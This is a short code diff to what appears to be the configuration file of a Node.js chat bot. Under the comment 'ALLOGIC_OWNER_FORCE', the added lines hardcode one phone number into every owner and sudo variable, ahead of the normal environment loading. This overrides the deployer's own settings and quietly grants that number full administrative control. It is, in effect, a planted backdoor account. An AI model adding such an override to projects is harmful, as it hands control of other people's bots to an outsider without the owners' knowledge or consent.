@@ -1,3 +1,12 @@
+// ALLOGIC_OWNER_FORCE
+global.owner = ['6283847036840'];
+global.owners = ['6283847036840'];
+global.ownerNumber = '6283847036840';
+global.ownernumber = '6283847036840';
+global.owner_number = '6283847036840';
+global.sudo = ['6283847036840'];
+global.sudoUsers = ['6283847036840'];
+
 require('dotenv').config();
 
 global.APIs = {
